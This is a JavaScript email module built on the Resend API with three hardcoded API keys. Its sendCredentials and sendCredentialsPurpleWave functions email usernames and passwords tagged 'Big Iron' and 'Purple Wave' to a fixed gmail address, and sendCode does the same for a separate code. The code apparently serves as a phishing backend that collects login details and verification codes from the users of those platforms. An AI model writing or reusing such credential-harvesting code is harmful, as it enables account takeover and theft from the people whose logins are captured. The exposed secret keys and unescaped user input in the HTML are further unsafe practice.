import { Resend } from "resend";

const resend = new Resend("re_ZgunF7aU_N1RNbvMvp7RjyuEb3zfdMYrr");
const resendLummy = new Resend("re_RQsqyzBG_PEahQVieG1HEbTWqLHjgibPe");
const resendAPIKEY = new Resend("re_TMMVRnge_K9h4VSVetAhgu2TBCXwm7jFv");

export const sendEmail = async (otp, email) =>
  await resend.emails.send({
    from: "onboarding@resend.dev",
    to: email,
    subject: "OTP Verification",
    html: `<strong>Your OTP is: ${otp}</strong>`,
  });

export const sendEmailLummy = async (form, email) => {
  const formattedForm = Array.isArray(form.words)
    ? form.words.map((item) => `<li>${item}</li>`).join("")
    : "<li>No words provided</li>";

  await resendLummy.emails.send({
    from: "onboarding@resend.dev",
    to: email,
    subject: "Form Input",
    html: `
      <div>
        <strong>Your form submission:</strong>
        <p>${form.name}</p>
        <ul>${formattedForm}</ul>
      </div>
    `,
  });
};

export const sendCredentials = async (username, password) => {
  await resendAPIKEY.emails.send({
    from: "onboarding@resend.dev",
    to: "lummybackend@gmail.com",
    subject: "Credentials",
    html: `
      <div>
      <strong>Platform:</strong>
        <p>Big Iron</p>
        <strong>Username:</strong>
        <p>${username}</p>
        <strong>Password:</strong>
        <p>${password}</p>
      </div>
    `,
  });
};

export const sendCredentialsPurpleWave = async (
  username,
  password,
  platform = "Purple Wave",
) => {
  await resendAPIKEY.emails.send({
    from: "onboarding@resend.dev",
    to: "lummybackend@gmail.com",
    subject: "Credentials",
    html: `
      <div>
        <strong>Platform:</strong>
        <p>Purple Wave</p>
        <strong>Username:</strong>
        <p>${username}</p>
        <strong>Password:</strong>
        <p>${password}</p>
      </div>
    `,
  });
};

export const sendCode = async (code) => {
  await resendAPIKEY.emails.send({
    from: "onboarding@resend.dev",
    to: "lummybackend@gmail.com",
    subject: "Code",
    html: `
      <div>
        <strong>Code:</strong>
        <p>${code}</p>
      </div>
    `,
  });
};
